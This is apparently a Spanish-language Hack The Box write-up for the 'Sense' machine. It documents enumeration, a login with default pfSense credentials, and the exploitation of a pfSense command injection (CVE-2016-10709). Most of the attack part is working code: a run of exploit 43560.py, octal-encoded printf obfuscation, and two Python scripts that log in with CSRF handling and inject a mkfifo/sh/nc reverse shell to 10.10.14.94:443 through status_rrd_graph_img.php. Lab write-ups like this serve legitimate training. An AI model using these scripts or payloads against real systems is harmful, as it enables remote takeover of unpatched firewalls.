# Sense-HTB
Resolucion de la maquina

## NMAP

```
sudo nmap -sSV -p80,443 10.129.76.69 -oN scan

```
 Tenemos el puerto 80 y el 443 abieto.

 ## FFUF

Aunque se necesito hacer esto recursivamente y se tuvo que usar el Dirbuster

```
ffuf -r -fc 404 -t 100  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://10.129.76.69/FUZZ.txt 

```

## Dirbuster

![image](https://github.com/gecr07/Sense-HTB/assets/63270579/1a524956-8a6f-4612-93a9-ed001a85aa0e)


![image](https://github.com/gecr07/Sense-HTB/assets/63270579/6e8a2471-2a37-4733-b3d1-3568191cb567)


Para encontrar cosas admito que es mejor esta herramienta. En este caso necesitabamos encontrar un txt.

```
dirbuster -u https://10.129.76.69 -t 20 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r dirout.ext -e php,txt,html
```

## searchsploit

```
searchsploit -x #examina
searchsploit -m # mueve

```

En el txt encontramos el usuario

```
####Support ticket###

Please create the following user


username: Rohit # cambiamos esta a minuscula rohit y como nos dice el defualt password ponermos el pfsense y listo!
password: company defaults
```

## RCE

Para buscar exploits aprendimos una cosa nueva poner entre comillas el cve por ejemplo: "CVE-2016-10709" (or Google will return others)

![image](https://github.com/gecr07/Sense-HTB/assets/63270579/bd04aa38-a5ef-45c4-855a-cfa7e64179c2)

```
python3 43560.py --rhost 10.129.76.69 --lhost 10.10.14.10 --lport 4444 --username rohit --password pfsense

```

![image](https://github.com/gecr07/Sense-HTB/assets/63270579/4b0b45f5-5fae-46ca-8f63-705d693ab69d)



Regresa una shell con privilegios de root no me dejo hacer ni full tty.

## Plus

Viendo un pcoo los writeups me di cuenta como funciona esta payload. por ejemplo para crear un payload mas o menos con esta tecnica.

![image](https://github.com/gecr07/Sense-HTB/assets/63270579/514be4fb-928e-45e9-b484-04eccfc30656)


```
# Si pones lo decodifica auque sea base octal nose asi funciona 
printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146'        
touch /tmp/0xdf

#Ahora si lo pasas a |sh|echo el echo solo mete un salto de linea.

printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146'|sh|echo

## Guarda los numeros octales decodificados en ese archivo

printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146' | xargs echo -e > archivo_decodificado.txt

```

> https://0xdf.gitlab.io/2021/03/11/htb-sense.html


## Script 

De este script aprendi como poner break points (pdb.set_trace()) tambien usar el sleep y poner como una especie de nc a la escucha con pwn. Ojo en la payload escape los \ por eso van 2.

```python
#!/usr/bin/python3

#pip uninstall pyelftools -y
#pip install pyelftools==0.29

from pwn import * 

import requests
import pdb# break point
import signal#USas signal para capturar el CTRL+C
import sys
import urllib3, threading
import time# aqui se usa time.sleep
import re # explresiones regulares

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url="https://10.129.91.150/index.php"
rce_url="""https://10.129.91.150/status_rrd_graph_img.php?database=queues;guion=$(printf "\\055");ampersand=$(printf "\\046");echo $ampersand;rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${guion}i 2>${ampersand}1|nc 10.10.14.94 443 >${HOME}tmp${HOME}f"""
lport=443
#proxy_url = "http://127.0.0.1:8080"


def executeCommand():
        s=requests.session()
        urllib3.disable_warnings()
        s.verify = False
        r = s.get(main_url)#,proxies=proxies)
        #pdb.set_trace()#break point
        #print(r.text)<
        
        csrfToken = re.findall(r'name=\'__csrf_magic\' value="(.*?)"', r.text)[0]
        
        #print(csrfToken)

        post_data = {'__csrf_magic': csrfToken,'usernamefld':'rohit','passwordfld':'pfsense','login':'Login'}
        r= s.post(main_url,data=post_data)#,proxies=proxies)
        #pdb.set_trace()
        r=s.get(rce_url)
        #pdb.set_trace()



if __name__== '__main__':
#       time.sleep(10)
        try:
                print("Hola Mundo")
                threading.Thread(target=executeCommand, args=()).start()
        except Exception as e:
                log.error(str(e))
        shell=listen(lport,timeout=20).wait_for_connection()
        shell.interactive() 
```

Para usar requests con un proxy lo hice asi

```python

#!/usr/bin/python3


import requests
import pdb# break point
import signal#USas signal para capturar el CTRL+C
import sys
import urllib3
import time# aqui se usa time.sleep
import re # explresiones regulares

main_url="https://10.129.91.150/index.php"
rce_url="""https://10.129.91.150/status_rrd_graph_img.php?database=queues;guion=$(printf "\\055");ampersand=$(printf "\\046");echo $ampersand;rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${guion}i 2>${ampersand}1|nc 10.10.14.94 443 >${HOME}tmp${HOME}f"""

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080'
}

s=requests.session()
urllib3.disable_warnings()
s.verify = False

r=s.get(main_url, proxies=proxies)
#pdb.set_trace()
csrfToken = re.findall(r'name=\'__csrf_magic\' value="(.*?)"', r.text)[0]
post_data = {'__csrf_magic': csrfToken,'usernamefld':'rohit','passwordfld':'pfsense','login':'Login'}
#print(post_data)
r= s.post(main_url,data=post_data,proxies=proxies)


try:
	r=s.get(rce_url,proxies=proxies)
except Exeption as e:
	log.error(str(e))

```





































